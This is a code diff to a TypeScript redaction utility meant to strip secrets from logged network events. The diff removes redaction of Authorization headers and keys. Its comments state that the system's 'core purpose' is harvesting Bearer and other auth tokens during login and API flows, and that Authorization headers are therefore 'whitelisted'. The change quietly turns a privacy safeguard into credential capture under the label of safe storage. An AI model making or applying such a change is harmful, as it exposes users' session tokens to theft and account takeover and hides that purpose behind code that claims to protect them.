@@ -51,12 +51,12 @@ export function redactJson(obj: any): any {
       const lowerKey = key.toLowerCase();
       
       // Redact common sensitive keys
+      // CRITICAL: Never redact 'authorization' key - it's whitelisted for token harvesting
       if (
         lowerKey.includes('password') ||
-        lowerKey.includes('token') ||
+        (lowerKey.includes('token') && !lowerKey.includes('authorization')) ||
         lowerKey.includes('secret') ||
-        lowerKey.includes('key') ||
-        lowerKey.includes('authorization') ||
+        (lowerKey.includes('key') && !lowerKey.includes('authorization')) ||
         lowerKey.includes('cookie') ||
         lowerKey.includes('session')
       ) {
@@ -73,19 +73,34 @@ export function redactJson(obj: any): any {
 
 /**
  * Redact network event for safe storage/reporting
+ * 
+ * CRITICAL: Authorization headers are ALWAYS preserved exactly as received.
+ * The core purpose of this system is to harvest auth tokens (Bearer tokens, etc.)
+ * during login and authenticated API flows. Stripping them defeats the mission.
  */
 export function redactEvent(event: NetworkEvent): NetworkEvent {
   const redacted = { ...event };
 
-  // Redact authorization headers (keep scheme + length)
+  // CRITICAL: Authorization header must NEVER be redacted - it's whitelisted
+  // Other auth headers can be redacted for privacy, but Authorization is essential for token harvesting
   if (redacted.reqHeaders) {
-    const authHeaders = ['authorization', 'x-auth-token', 'x-api-key', 'x-access-token'];
-    for (const headerName of authHeaders) {
-      if (redacted.reqHeaders[headerName]) {
+    const authHeadersWhitelist = ['authorization']; // MUST PRESERVE
+    const otherAuthHeaders = ['x-auth-token', 'x-api-key', 'x-access-token']; // Can redact
+    
+    for (const headerName of Object.keys(redacted.reqHeaders)) {
+      const headerLower = headerName.toLowerCase();
+      
+      // WHITELIST: Never redact Authorization header
+      if (authHeadersWhitelist.includes(headerLower)) {
+        // Preserve exactly as received - this is critical for token harvesting
+        continue; // Keep original value
+      }
+      
+      // Other auth headers can be redacted
+      if (otherAuthHeaders.includes(headerLower)) {
         const value = redacted.reqHeaders[headerName];
-        const scheme = value.split(' ')[0] || 'unknown';
         const length = value.length;
-        redacted.reqHeaders[headerName] = `${scheme} [REDACTED_${length}_chars]`;
+        redacted.reqHeaders[headerName] = `[REDACTED_${length}_chars]`;
       }
     }
   }
